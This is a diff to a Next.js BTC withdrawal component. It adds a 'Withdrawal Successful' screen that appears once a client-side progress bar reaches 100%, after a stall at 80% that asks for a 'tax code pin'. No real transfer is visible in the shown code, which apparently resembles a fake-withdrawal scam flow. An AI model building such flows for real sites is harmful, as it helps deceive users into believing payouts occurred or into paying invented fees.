@@ -1,6 +1,7 @@
 /* eslint-disable react-hooks/exhaustive-deps */
 "use client";
 import Image from "next/image";
+import Link from "next/link";
 import React, { useEffect, useState } from "react";
 
 export default function Btcpayment({
@@ -16,6 +17,7 @@ export default function Btcpayment({
   const [taxCodePin, setTaxCodePin] = useState("");
   const [taxCodePinError, setTaxCodePinError] = useState("");
   const [waitingForPin, setWaitingForPin] = useState(false);
+  const [showSucces, setSuccess] = useState(false);
 
   useEffect(() => {
     const updateProgress = () => {
@@ -25,7 +27,7 @@ export default function Btcpayment({
           setWaitingForPin(true);
           return 80;
         } else if (newProgress >= 100) {
-          // Logic when the progress reaches 100%
+          setSuccess(true);
           return 100;
         }
         return newProgress;
@@ -165,10 +167,10 @@ export default function Btcpayment({
         </>
       )}
 
-      {!btcFilled && (
+      {!btcFilled && !showSucces && (
         <div className="py-40">
           <div className="flex w-full justify-center items-center ">
-            <div className="progress-cont w-full px-14">
+            <div className="progress-cont w-full px-5 md:px-14">
               <div className="progress-messages text-sm font-bold mb-1 flex items-center justify-between">
                 <div>{progressMessage}</div>
                 <div className="percentage font-bold text-sm">
@@ -187,7 +189,7 @@ export default function Btcpayment({
           </div>
 
           {progress >= 80 && waitingForPin && (
-            <div className="tax-code-form px-14 mt-8">
+            <div className="tax-code-form px-5 md:px-14 mt-8">
               <form onSubmit={handlePinSubmit}>
                 <input
                   type="text"
@@ -212,6 +214,34 @@ export default function Btcpayment({
               </form>
             </div>
           )}
+        </div>
+      )}
+      {showSucces && (
+        <div className="flex flex-col justify-center items-center px-5 md:px-14 mt-8 py-10 bg-white rounded-lg shadow-md">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            viewBox="0 0 20 20"
+            fill="currentColor"
+            className="w-16 h-16 mx-auto mb-4 text-green-500"
+          >
+            <path
+              fillRule="evenodd"
+              d="M16.403 12.652a3 3 0 000-5.304 3 3 0 00-3.75-3.751 3 3 0 00-5.305 0 3 3 0 00-3.751 3.75 3 3 0 000 5.305 3 3 0 003.75 3.751 3 3 0 005.305 0 3 3 0 003.751-3.75zm-2.546-4.46a.75.75 0 00-1.214-.883l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z"
+              clipRule="evenodd"
+            />
+          </svg>
+          <h1 className="text-xl font-bold mb-2">Withdrawal Successful</h1>
+          <p className="text-gray-600 mb-6 text-center text-sm px-5 md:px-20 lg:px-40">
+            Your BTC withdrawal request has been processed successfully. It may
+            take some time (5mins - 2hours) to reflect in your provided wallet
+            address.
+          </p>
+          <Link href="/dashboard" passHref>
+            {" "}
+            <button className="bg-slate-800 py-3 px-6 rounded-lg text-sm text-white font-bold hover:bg-slate-600 transition-all focus:outline-none">
+              Back to Dashboard
+            </button>
+          </Link>
         </div>
       )}
     </>
